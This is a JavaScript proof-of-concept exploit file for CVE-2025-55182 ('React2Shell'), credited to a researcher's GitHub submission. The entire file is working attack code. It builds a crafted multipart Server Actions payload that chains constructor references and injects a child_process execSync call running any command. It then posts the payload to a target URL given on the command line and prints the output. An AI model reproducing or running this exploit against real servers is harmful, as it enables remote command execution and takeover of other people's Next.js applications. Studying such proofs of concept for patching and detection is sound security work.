// Official PoC based on Lachlan Davidson's submission
// CVE-2025-55182 (React2Shell)
// Source: https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc

const FormData = require('form-data');

async function exploitNextjs(targetUrl, command = 'id') {
  // Construct the payload with circular references as per official PoC
  const payload = {
    '0': '$1',
    '1': {
      'status': 'resolved_model',
      'reason': 0,
      '_response': '$4',
      'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
      'then': '$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
      // Inject command here - the official PoC uses JavaScript code injection
      '_prefix': `require('child_process').execSync('${command}').toString()//`,
      '_formData': {'get': '$3:constructor:constructor'},
      '_chunks': '$2:_response:_chunks',
    }
  };

  // Serialize payload as multipart form data
  const fd = new FormData();
  for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]));
  }

  try {
    console.log(`[*] Targeting: ${targetUrl}`);
    console.log(`[*] Command: ${command}`);
    console.log('[*] Sending payload...');

    // Convert FormData stream to buffer for proper transmission
    const buffer = await new Promise((resolve, reject) => {
      const chunks = [];
      fd.on('data', (chunk) => chunks.push(chunk));
      fd.on('end', () => resolve(Buffer.concat(chunks)));
      fd.on('error', reject);
    });

    const response = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        ...fd.getHeaders(),
        'next-action': '1' // Required header for Next.js Server Actions
      },
      body: buffer
    });

    const text = await response.text();
    console.log('\n[+] Response:');
    console.log(text);

  } catch (e) {
    console.error('[!] Error:', e.message);
  }
}

// Main execution
const targetUrl = process.argv[2] || 'http://localhost:3000';
const command = process.argv[3] || 'id';

exploitNextjs(targetUrl, command);
